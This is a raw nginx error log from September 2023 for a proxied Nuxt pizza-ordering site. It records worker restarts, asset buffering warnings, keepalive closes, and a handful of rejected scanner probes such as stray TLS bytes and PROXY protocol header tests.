2023/09/17 12:21:58 [warn] 23#23: *5 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/menu"
2023/09/17 12:23:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 12:23:54 [notice] 23#23: gracefully shutting down
2023/09/17 12:23:54 [notice] 23#23: exiting
2023/09/17 12:23:54 [notice] 23#23: exit
2023/09/17 12:23:54 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/17 12:23:54 [notice] 1#1: worker process 23 exited with code 0
2023/09/17 12:23:54 [notice] 1#1: exit
2023/09/17 12:24:38 [notice] 1#1: using the "epoll" event method
2023/09/17 12:24:38 [notice] 1#1: nginx/1.25.2
2023/09/17 12:24:38 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 12:24:38 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 12:24:38 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 12:24:38 [notice] 1#1: start worker processes
2023/09/17 12:24:38 [notice] 1#1: start worker process 23
2023/09/17 12:24:55 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.f6f67331.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.f6f67331.js", host: "85.31.238.178", referrer: "http://85.31.238.178/menu"
2023/09/17 12:24:55 [warn] 23#23: *10 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/menu"
2023/09/17 12:24:55 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/menu"
2023/09/17 12:26:35 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 12:26:35 [notice] 23#23: gracefully shutting down
2023/09/17 12:26:35 [notice] 23#23: exiting
2023/09/17 12:26:35 [notice] 23#23: exit
2023/09/17 12:26:35 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/17 12:26:35 [notice] 1#1: worker process 23 exited with code 0
2023/09/17 12:26:35 [notice] 1#1: exit
2023/09/17 12:26:53 [notice] 1#1: using the "epoll" event method
2023/09/17 12:26:53 [notice] 1#1: nginx/1.25.2
2023/09/17 12:26:53 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 12:26:53 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 12:26:53 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 12:26:53 [notice] 1#1: start worker processes
2023/09/17 12:26:53 [notice] 1#1: start worker process 23
2023/09/17 12:27:00 [warn] 23#23: *2 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.f6f67331.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.f6f67331.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/17 12:27:00 [warn] 23#23: *6 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/17 12:27:00 [warn] 23#23: *8 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/17 12:27:07 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 12:27:07 [notice] 23#23: gracefully shutting down
2023/09/17 12:27:07 [notice] 23#23: exiting
2023/09/17 12:27:07 [notice] 23#23: exit
2023/09/17 12:27:07 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/17 12:27:07 [notice] 1#1: worker process 23 exited with code 0
2023/09/17 12:27:07 [notice] 1#1: exit
2023/09/17 12:27:34 [notice] 1#1: using the "epoll" event method
2023/09/17 12:27:34 [notice] 1#1: nginx/1.25.2
2023/09/17 12:27:34 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 12:27:34 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 12:27:34 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 12:27:34 [notice] 1#1: start worker processes
2023/09/17 12:27:34 [notice] 1#1: start worker process 22
2023/09/17 15:11:19 [info] 22#22: *1 client 45.95.147.241 closed keepalive connection
2023/09/17 17:35:26 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 17:35:26 [notice] 22#22: gracefully shutting down
2023/09/17 17:35:26 [notice] 22#22: exiting
2023/09/17 17:35:26 [notice] 22#22: exit
2023/09/17 17:35:26 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/17 17:35:26 [notice] 1#1: worker process 22 exited with code 0
2023/09/17 17:35:26 [notice] 1#1: exit
2023/09/17 17:36:16 [notice] 1#1: using the "epoll" event method
2023/09/17 17:36:16 [notice] 1#1: nginx/1.25.2
2023/09/17 17:36:16 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 17:36:16 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 17:36:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 17:36:16 [notice] 1#1: start worker processes
2023/09/17 17:36:16 [notice] 1#1: start worker process 23
2023/09/17 17:39:08 [warn] 23#23: *2 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/entry.a6f2b5c3.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.a6f2b5c3.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/17 17:39:36 [warn] 23#23: *11 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/entry.a6f2b5c3.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.a6f2b5c3.js", host: "85.31.238.178", referrer: "http://85.31.238.178/order"
2023/09/17 17:39:37 [warn] 23#23: *2 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/order"
2023/09/17 17:39:37 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 125.21.249.98, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/order"
2023/09/17 17:40:09 [info] 23#23: *23 client timed out (110: Connection timed out) while waiting for request, client: 125.21.249.98, server: 0.0.0.0:80
2023/09/17 18:18:26 [info] 23#23: *48 client 63.135.161.153 closed keepalive connection
2023/09/17 18:18:26 [info] 23#23: *50 client 173.239.211.71 closed keepalive connection
2023/09/17 18:18:27 [info] 23#23: *52 client 63.135.161.133 closed keepalive connection
2023/09/17 18:18:35 [info] 23#23: *54 client 63.135.161.156 closed keepalive connection
2023/09/17 18:18:36 [info] 23#23: *56 client 173.239.211.58 closed keepalive connection
2023/09/17 18:18:41 [info] 23#23: *58 client 63.135.161.152 closed keepalive connection
2023/09/17 18:18:42 [info] 23#23: *60 client 63.135.161.155 closed keepalive connection
2023/09/17 18:18:54 [info] 23#23: *62 client 63.135.161.143 closed keepalive connection
2023/09/17 18:18:56 [info] 23#23: *64 client 63.135.161.142 closed keepalive connection
2023/09/17 18:19:00 [info] 23#23: *66 client 173.239.211.76 closed keepalive connection
2023/09/17 18:19:01 [info] 23#23: *68 client 63.135.161.143 closed keepalive connection
2023/09/17 18:19:06 [info] 23#23: *70 client 173.239.211.60 closed keepalive connection
2023/09/17 18:19:06 [info] 23#23: *72 client 173.239.211.76 closed keepalive connection
2023/09/17 18:19:18 [info] 23#23: *74 client 63.135.161.148 closed keepalive connection
2023/09/17 18:19:19 [info] 23#23: *76 client 63.135.161.146 closed keepalive connection
2023/09/17 18:19:23 [info] 23#23: *78 client 173.239.211.61 closed keepalive connection
2023/09/17 18:19:27 [info] 23#23: *80 client 63.135.161.156 closed keepalive connection
2023/09/17 18:19:34 [info] 23#23: *82 client 63.135.161.152 closed keepalive connection
2023/09/17 18:19:35 [info] 23#23: *84 client 173.239.211.75 closed keepalive connection
2023/09/17 18:19:43 [info] 23#23: *86 client 173.239.211.71 closed keepalive connection
2023/09/17 18:19:44 [info] 23#23: *88 client 173.239.211.71 closed keepalive connection
2023/09/17 18:19:50 [info] 23#23: *90 client 63.135.161.140 closed keepalive connection
2023/09/17 18:19:54 [info] 23#23: *92 client 173.239.211.65 closed keepalive connection
2023/09/17 18:19:58 [info] 23#23: *94 client 63.135.161.130 closed keepalive connection
2023/09/17 18:19:58 [info] 23#23: *96 client 63.135.161.133 closed keepalive connection
2023/09/17 18:20:12 [info] 23#23: *98 client 63.135.161.148 closed keepalive connection
2023/09/17 18:20:12 [info] 23#23: *100 client 63.135.161.155 closed keepalive connection
2023/09/17 18:20:23 [info] 23#23: *102 client 63.135.161.130 closed keepalive connection
2023/09/17 18:20:27 [info] 23#23: *104 client 63.135.161.138 closed keepalive connection
2023/09/17 18:20:35 [info] 23#23: *106 client 173.239.211.67 closed keepalive connection
2023/09/17 18:20:35 [info] 23#23: *108 client 63.135.161.138 closed keepalive connection
2023/09/17 18:20:46 [info] 23#23: *110 client 173.239.211.69 closed keepalive connection
2023/09/17 18:20:46 [info] 23#23: *112 client 63.135.161.130 closed keepalive connection
2023/09/17 18:21:00 [info] 23#23: *114 client 63.135.161.150 closed keepalive connection
2023/09/17 18:21:01 [info] 23#23: *116 client 173.239.211.74 closed keepalive connection
2023/09/17 18:21:07 [info] 23#23: *118 client 63.135.161.157 closed keepalive connection
2023/09/17 18:21:07 [info] 23#23: *120 client 173.239.211.73 closed keepalive connection
2023/09/17 18:21:13 [info] 23#23: *122 client 63.135.161.148 closed keepalive connection
2023/09/17 18:21:14 [info] 23#23: *124 client 63.135.161.134 closed keepalive connection
2023/09/17 18:21:16 [info] 23#23: *126 client 63.135.161.152 closed keepalive connection
2023/09/17 18:21:17 [info] 23#23: *128 client 173.239.211.76 closed keepalive connection
2023/09/17 18:21:31 [info] 23#23: *130 client 191.101.41.159 closed keepalive connection
2023/09/17 18:21:51 [info] 23#23: *132 client 173.239.211.74 closed keepalive connection
2023/09/17 18:22:00 [info] 23#23: *134 client 63.135.161.144 closed keepalive connection
2023/09/17 18:22:10 [info] 23#23: *136 client 63.135.161.145 closed keepalive connection
2023/09/17 18:22:29 [info] 23#23: *138 client 63.135.161.155 closed keepalive connection
2023/09/17 18:22:40 [info] 23#23: *140 client 173.239.211.75 closed keepalive connection
2023/09/17 18:22:48 [info] 23#23: *142 client 173.239.211.60 closed keepalive connection
2023/09/17 18:23:00 [info] 23#23: *144 client 63.135.161.144 closed keepalive connection
2023/09/17 18:31:34 [info] 23#23: *146 client closed connection while waiting for request, client: 136.34.223.66, server: 0.0.0.0:80
2023/09/17 18:31:34 [info] 23#23: *147 client 136.34.223.66 closed keepalive connection (104: Connection reset by peer)
2023/09/17 18:51:34 [info] 23#23: *149 client sent invalid method while reading client request line, client: 218.32.249.127, server: _, request: " {  w"
2023/09/17 18:51:38 [info] 23#23: *150 client sent invalid method while reading client request line, client: 218.32.249.127, server: _, request: " {  w¯‰à–Aô"
2023/09/17 19:06:57 [info] 23#23: *151 client sent invalid method while reading client request line, client: 34.65.133.72, server: _, request: " M  Iø0‘∫éM’Öú@PÕä±l4™yß?G ≤È(0Íî îv˘®X√J†‘‚¬+%uòeò"
2023/09/17 19:34:00 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/17 19:34:00 [notice] 23#23: gracefully shutting down
2023/09/17 19:34:00 [notice] 23#23: exiting
2023/09/17 19:34:00 [notice] 23#23: exit
2023/09/17 19:34:00 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/17 19:34:00 [notice] 1#1: worker process 23 exited with code 0
2023/09/17 19:34:00 [notice] 1#1: exit
2023/09/17 19:36:55 [notice] 1#1: using the "epoll" event method
2023/09/17 19:36:55 [notice] 1#1: nginx/1.25.2
2023/09/17 19:36:55 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/17 19:36:55 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/17 19:36:55 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/17 19:36:55 [notice] 1#1: start worker processes
2023/09/17 19:36:55 [notice] 1#1: start worker process 23
2023/09/17 22:27:24 [info] 23#23: *1 recv() failed (104: Connection reset by peer) while reading client pipelined request line, client: 194.180.48.238, server: _
2023/09/18 04:47:54 [info] 23#23: *3 client 5.32.176.101 closed keepalive connection
2023/09/18 10:07:46 [info] 23#23: *7 recv() failed (104: Connection reset by peer) while waiting for request, client: 167.94.138.34, server: 0.0.0.0:80
2023/09/18 10:07:48 [info] 23#23: *8 client 167.94.138.34 closed keepalive connection (104: Connection reset by peer)
2023/09/18 10:07:48 [info] 23#23: *10 client 167.94.138.34 closed keepalive connection
2023/09/18 10:07:48 [info] 23#23: *12 client sent invalid request while reading client request line, client: 167.94.138.34, server: _, request: "PRI * HTTP/2.0"
2023/09/18 10:07:48 [info] 23#23: *12 recv() failed (104: Connection reset by peer) while reading client request line, client: 167.94.138.34, server: _, request: "PRI * HTTP/2.0"
2023/09/18 10:51:35 [info] 23#23: *15 client 192.35.222.19 closed keepalive connection
2023/09/18 11:13:01 [info] 23#23: *17 client sent invalid request while reading client request line, client: 192.35.222.19, server: _, request: "PROXY TCP4 192.35.222.19 85.31.238.178 54974 80"
2023/09/18 11:33:44 [info] 23#23: *18 client sent invalid request while reading client request line, client: 192.35.222.19, server: _, request: "PROXY TCP4 127.0.0.1 85.31.238.178 54974 80"
2023/09/18 11:54:55 [info] 23#23: *19 client sent invalid request while reading client request line, client: 192.35.222.19, server: _, request: "PROXY TCP4 10.0.0.10 85.31.238.178 54974 80"
2023/09/18 12:16:00 [info] 23#23: *20 client sent invalid request while reading client request line, client: 192.35.222.19, server: _, request: "PROXY TCP4 172.16.0.10 85.31.238.178 54974 80"
2023/09/18 12:17:10 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 12:17:10 [notice] 23#23: gracefully shutting down
2023/09/18 12:17:10 [notice] 23#23: exiting
2023/09/18 12:17:10 [notice] 23#23: exit
2023/09/18 12:17:10 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 12:17:10 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 12:17:10 [notice] 1#1: exit
2023/09/18 12:21:24 [notice] 1#1: using the "epoll" event method
2023/09/18 12:21:24 [notice] 1#1: nginx/1.25.2
2023/09/18 12:21:24 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 12:21:24 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 12:21:24 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 12:21:24 [notice] 1#1: start worker processes
2023/09/18 12:21:24 [notice] 1#1: start worker process 23
2023/09/18 12:26:26 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 12:26:26 [notice] 23#23: gracefully shutting down
2023/09/18 12:26:26 [notice] 23#23: exiting
2023/09/18 12:26:26 [notice] 23#23: exit
2023/09/18 12:26:26 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 12:26:26 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 12:26:26 [notice] 1#1: exit
2023/09/18 12:27:16 [notice] 1#1: using the "epoll" event method
2023/09/18 12:27:16 [notice] 1#1: nginx/1.25.2
2023/09/18 12:27:16 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 12:27:16 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 12:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 12:27:16 [notice] 1#1: start worker processes
2023/09/18 12:27:16 [notice] 1#1: start worker process 23
2023/09/18 12:28:04 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.a191400a.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.a191400a.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/18 12:29:04 [warn] 23#23: *12 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.a191400a.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.a191400a.js", host: "85.31.238.178", referrer: "http://85.31.238.178/reports"
2023/09/18 12:29:04 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/reports"
2023/09/18 12:29:05 [warn] 23#23: *10 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/reports"
2023/09/18 12:37:01 [info] 23#23: *46 client sent invalid request while reading client request line, client: 192.35.222.19, server: _, request: "PROXY TCP4 192.168.0.10 85.31.238.178 54974 80"
2023/09/18 12:42:24 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/18 12:42:24 [notice] 23#23: gracefully shutting down
2023/09/18 12:42:24 [notice] 23#23: exiting
2023/09/18 12:42:24 [notice] 23#23: exit
2023/09/18 12:42:24 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/18 12:42:24 [notice] 1#1: worker process 23 exited with code 0
2023/09/18 12:42:24 [notice] 1#1: exit
2023/09/18 12:43:13 [notice] 1#1: using the "epoll" event method
2023/09/18 12:43:13 [notice] 1#1: nginx/1.25.2
2023/09/18 12:43:13 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/18 12:43:13 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/18 12:43:13 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/18 12:43:13 [notice] 1#1: start worker processes
2023/09/18 12:43:13 [notice] 1#1: start worker process 23
2023/09/18 12:44:48 [warn] 23#23: *2 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/entry.b64944a1.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.b64944a1.js", host: "85.31.238.178", referrer: "http://85.31.238.178/reports"
2023/09/18 12:44:48 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/reports"
2023/09/18 12:44:49 [warn] 23#23: *4 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/reports"
2023/09/18 12:44:55 [info] 23#23: *4 client 103.77.186.50 closed keepalive connection
2023/09/18 12:44:55 [info] 23#23: *8 client 103.77.186.50 closed keepalive connection
2023/09/18 12:44:56 [info] 23#23: *1 client 103.77.186.50 closed keepalive connection
2023/09/18 12:44:56 [info] 23#23: *10 client 103.77.186.50 closed keepalive connection
2023/09/18 12:44:56 [info] 23#23: *9 client 103.77.186.50 closed keepalive connection
